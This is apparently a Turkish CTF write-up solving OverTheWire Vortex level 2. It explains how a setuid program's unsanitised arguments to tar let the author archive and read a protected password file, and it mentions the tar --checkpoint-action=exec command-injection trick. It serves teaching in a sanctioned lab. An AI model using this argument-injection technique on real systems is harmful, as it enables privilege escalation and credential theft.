# OverTheWire — Vortex Level 2 → 3

> Hedef: `vortex2`'den `vortex3` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: setuid program kullanıcı argümanlarını `tar`'a operand geçiriyor → tar'a (euid=vortex3) **parola dosyasını arşivlet**, grup-okunur arşivden çıkar.
> Ortam: 32-bit x86 setuid (vortex3); zafiyet bellek değil, **güvensiz alt-süreç çağrısı**.

---

## 1. Bağlantı
```bash
ssh vortex2@vortex.labs.overthewire.org -p 2228   # şifre: vortex1'den alındı
```
`/vortex/vortex2` → `-r-sr-x---  vortex3 vortex2` (setuid vortex3). Kaynak yok → `objdump` + `strings` (görülen: `/bin/tar`, `/tmp/ownership.$$.tar`).

## 2. Analiz (`objdump` → sözde-kod)
```c
int main(int argc, char **argv) {
    char *args[6];
    args[0] = "/bin/tar";
    args[1] = "cf";
    args[2] = "/tmp/ownership.$$.tar";   // SABİT yol — execv, kabuk YOK → $$ genişlemez, literal
    args[3] = argv[1];                    // ← kullanıcı kontrollü
    args[4] = argv[2];                    // ← kullanıcı kontrollü
    args[5] = argv[3];                    // ← kullanıcı kontrollü
    execv("/bin/tar", args);              // tar cf /tmp/ownership.$$.tar <argv1> <argv2> <argv3>
}
```

## 3. Zafiyet
- Program, kullanıcının `argv[1..3]`'ünü **doğrudan** `tar`'a operand olarak geçiriyor ve tar **euid=vortex3** ile koşuyor (setuid).
- Sen tar'a "hangi dosyaları arşivle" diye söylüyorsun → tar o dosyaları **vortex3 yetkisiyle** okuyabiliyor.
- Çıkan arşiv `/tmp/ownership.$$.tar`: sahip vortex3 ama **mod `-rw-rw-r--`, grup vortex2** → biz (vortex2, grup vortex2) **okuyabiliyoruz**.
- Fikir: tar'a **parola dosyasını arşivlet** → içeriği arşive girer → arşivi okuyup çıkar.

> 💡 **İki tar yolu:** (A) parola dosyasını arşivlemek [kullandığım, en temiz]; (B) klasik tar **`--checkpoint-action=exec=`** komut enjeksiyonu (`--`'li operand'ı tar opsiyon sanar). B, seviyenin verdiği "GNU tar manual" ipucunun işaret ettiği yol ama iki pürüzü var: checkpoint'in ateşlemesi için yeterli **kayıt** gerekir ve eylem `sh -c` üzerinden koştuğu için **yetki düşebilir**. A bu ikisini de atlatır.

## 4. Exploit (A — parola dosyasını arşivlet)
```bash
cd /tmp
/vortex/vortex2 /etc/vortex_pass/vortex3     # → tar cf /tmp/ownership.$$.tar /etc/vortex_pass/vortex3
tar xOf '/tmp/ownership.$$.tar'              # arşivdeki içeriği stdout'a çıkar (x=extract, O=stdout, f=file)
```
Çıktı:
```
/bin/tar: Removing leading `/' from member names     # (tar'ın normal uyarısı)
**********
```
Doğrulama: `tar tvf '/tmp/ownership.$$.tar'` → `-r-------- vortex3/vortex3 ... etc/vortex_pass/vortex3` (tar dosyayı vortex3 olarak okumuş).

> ⚠️ **SIGPIPE tuzağı (canlı çözümde çıktı):** programın çıktısını `| head` gibi bir pipe'a verirsen, pipe erken kapanınca `tar` **SIGPIPE** ile ölür ve yarım/bayat arşiv bırakır (eski `mtime`, boş içerik). Programı **pipe'sız** çalıştır, arşivi sonra ayrı oku.

> ⚠️ **sabit çıktı yolu:** `/tmp/ownership.$$.tar` literal (execv, `$$` genişlemez). Dosya vortex3 sahipli; sticky `/tmp`'de onu **silemezsin** ama tar (euid vortex3) **üzerine yazabilir** ve grup-`rw` olduğu için **okuyabilirsin**.

## Dersler
| Konu | Not |
|------|-----|
| Güvensiz alt-süreç | Kullanıcı argümanını ayrıcalıklı bir programa (tar) süzmeden geçirmek = privesc |
| Confused deputy | setuid program, senin adına vortex3 yetkisiyle dosya okur ([[vortex1]] setuid mantığının devamı) |
| tar = dosya okuma primitifi | "Neyi arşivle" kontrolü = "hangi dosyayı vortex3 olarak oku" kontrolü |
| Grup izinleri | Çıktı `-rw-rw-r--` grup vortex2 → arşivi okuyup içeriği çıkarabiliriz |
| `tar xOf` | Arşiv üyesini diske açmadan **stdout**'a döker → hızlı içerik okuma |
| tar checkpoint trick | `--checkpoint-action=exec=CMD` = klasik tar RCE; ama kayıt + `sh -c` yetki düşmesi pürüzlü |
| SIGPIPE | Alt-süreç yazarken `| head` pipe'ı erken kapatma → SIGPIPE → yarım çıktı |
| execv vs system | execv kabuk açmaz → `$$` literal kalır; ama argüman enjeksiyonu yine mümkün |
